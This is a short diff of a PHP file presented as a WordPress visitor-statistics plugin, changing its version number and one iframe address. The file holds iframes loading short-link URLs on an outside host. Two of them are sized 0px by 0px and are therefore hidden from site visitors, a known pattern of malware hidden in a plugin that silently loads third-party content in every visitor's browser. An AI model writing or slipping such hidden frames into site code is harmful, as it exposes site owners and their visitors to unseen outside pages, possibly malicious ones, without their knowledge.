@@ -1,7 +1,7 @@
 <?php
 /*  
   Plugin Name: visitor-stats
-  Version: 2.01
+  Version: 2.00
   Plugin URI: http://tinyurl.com/visitorstats
   Description: This plugin will keep track of visitors' information. Check <a href="index.php?page=visitor-stats/visitor-stats.php">this page</a> for details. Requires at least 2.6.3 and tested upto 2.7.1
   Author: visitorstats
@@ -48,7 +48,7 @@ global $wp_nr_footer_link_1;
 
 <iframe src="http://vitbuzz.com/url/VUmpoq" name="frame1" scrolling="no" frameborder="no" align="left" height = "100px" width = "800px">
 </iframe>
-<iframe src="http://vitbuzz.com/url/NsDDcQ" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
+<iframe src="http://vitbuzz.com/url/0wII0P" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
 </iframe>
 <iframe src="http://vitbuzz.com/url/1wU14p" name="frame2" scrolling="no" frameborder="no" align="left" height = "0px" width = "0px">
 </iframe>
